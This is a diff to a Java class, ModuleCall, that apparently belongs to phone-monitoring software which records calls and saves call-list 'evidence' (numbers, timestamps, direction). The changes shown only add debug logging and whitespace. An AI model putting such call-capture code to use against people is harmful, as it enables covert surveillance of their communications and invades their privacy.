@@ -112,12 +112,13 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			number = call.getNumber();		
 		}
 		
-		if(number==null){
+		if (number == null) {
 			number="";
 		}
 
 		final DateTime to = new DateTime(call.getTimestamp());
 		int ret = 0;
+		
 		try {
 			// Let's start with call recording
 			if (record && isSupported()) {
@@ -130,7 +131,12 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 		}
 
+
 		if (!record && !call.isOngoing()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): Saving CallList evidence"); //$NON-NLS-1$
+			}
+
 			saveCalllistEvidence(number, incoming, from, to);
 		}
 
@@ -307,6 +313,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		additionalData.write(caller);
 		additionalData.write(callee);
+		
 		return additionaldata;
 	}
 
@@ -314,6 +321,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveCalllistEvidence): " + number + " from: " + from + " to: " + to);
 		}
+		
 		if (Cfg.DEBUG) { Check.asserts(number!=null, " (saveCalllistEvidence) Assert failed"); }
 		final boolean outgoing = !incoming;
 		// final int duration = call.getDuration(call);
@@ -340,6 +348,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		databuffer.writeInt(LOG_CALLIST_VERSION);
 		databuffer.writeLong(from.getFiledate());
 		databuffer.writeLong(to.getFiledate());
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (saveCalllistEvidence): Duration from: " + from.getFiledate() + " to: " + to.getFiledate()); //$NON-NLS-1$
+		}
 
 		final int flags = (outgoing ? 1 : 0) + (missed ? 0 : 6);
 		databuffer.writeInt(flags);
